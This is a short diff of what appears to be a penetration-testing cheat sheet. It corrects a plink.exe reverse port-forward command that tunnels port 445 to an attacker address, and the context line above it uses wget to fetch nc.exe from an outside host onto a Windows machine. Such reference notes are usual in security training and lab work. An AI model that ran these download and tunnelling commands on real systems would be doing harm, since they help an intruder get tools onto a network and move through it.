@@ -15,7 +15,7 @@ wget "http://10.10.10.10/nc.exe" outfile "c:\nc.exe"
 
 # Plink.exe
 ```
-plink.exe -l root -pw toor -R 445:127.0.0.1:44510.10.14.110
+plink.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.14.110
 ```
 ### Usage
 ```Usage: plink [options] [user@]host [command]                                                                                                                                                                                               
